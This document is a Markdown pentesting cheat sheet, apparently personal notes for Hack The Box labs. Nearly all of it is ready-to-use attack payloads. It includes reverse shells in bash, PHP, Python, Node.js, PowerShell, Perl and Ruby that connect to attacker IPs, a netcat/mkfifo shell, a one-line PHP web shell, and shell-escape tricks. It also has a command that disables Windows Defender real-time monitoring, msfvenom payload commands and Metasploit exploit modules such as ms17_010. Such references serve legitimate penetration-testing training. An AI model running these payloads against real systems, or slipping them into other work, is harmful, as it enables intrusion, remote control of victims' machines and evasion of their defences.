
- [ ] [[#Escape Restricted Shell]]
- [ ] [[#Netcat Bind Shell]]
- [ ] [[#Web Shells]]
- [ ] [[#Reverse Shells]]

## **Useful Resources**

* [RevShells.com](https://www.revshells.com/)
* [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
* [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [ExploitNotes](https://exploit-notes.hdks.org/exploit/shell/reverse-shell-cheat-sheet/)
* [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

---

## Escape Restricted Shell

[HandBook](https://0xffsec.com/handbook/shells/restricted-shells/)

```shell
ssh htb-user@10.129.205.109 -t bash
### Worth a try
```

---

## Netcat Bind Shell

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

---

## Web Shells

### [Landanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
Modify IP and Port and upload the webshell

### [Antak Web Shell - Nishang project](https://github.com/samratashok/nishang)
Antak is an advanced web shell built in ASP.Net.

### [PHP Web Shells](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

```php
<?php system($_REQUEST[0]); ?>
### Tiny Web Shell
```

---

# Reverse Shells

## Bash Reverse Shells

```sh
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 

bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" 

0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
```

---

## [PHP Reverse Shells](https://github.com/flast101/reverse-shell-cheatsheet/blob/master/php-reverse-shell.php)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
```

---

## Python Reverse Shells

```python
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

> __import__("os").system("bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'")

> python -c 'import pty; pty.spawn("/bin/sh")'
```

---

## Node.js Reverse Shells

```js
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');

JSShell: https://github.com/shelld3v/JSshell
```

---

## Powershell Payloads

```PowerShell
Reverse Shell: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Disable real time monitoring in Windows Defender: Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## Perl Reverse Shells

```perl
perl -e 'exec "/bin/sh";'

perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Ruby Reverse Shells

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Linux Payloads

```sh
> awk 'BEGIN {system("/bin/sh")}' 
> find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;'
> find . -exec /bin/sh \; -quit 
> vim -c ':!/bin/sh'
```

---

## **Msfconsole & Msfvenom**

| Commands                                                                                          | Description                                                                                                                 |
| ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| use exploit/multi/handler                                                                         | Connector module for the hosts to the shells on target                                                                      |
| use exploit/windows/smb/psexec                                                                    | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec |
| msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf    | MSFvenom command used to generate a linux-based reverse shell stageless payload                                             |
| msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe      | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                           |
| msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho  | MSFvenom command used to generate a MacOS-based reverse shell payload                                                       |
| msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp | MSFvenom command used to generate a ASP web reverse shell payload                                                           |
| msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp    | MSFvenom command used to generate a JSP web reverse shell payload                                                           |
| msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war    | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                       |
| use auxiliary/scanner/smb/smb\_ms17\_010                                                          | Metasploit exploit module used to check if a host is vulnerable to ms17\_010                                                |
| use exploit/windows/smb/ms17\_010\_psexec                                                         | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17\_010    |
| use exploit/linux/http/rconfig\_vendors\_auth\_file\_upload\_rce                                  | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6     |

***

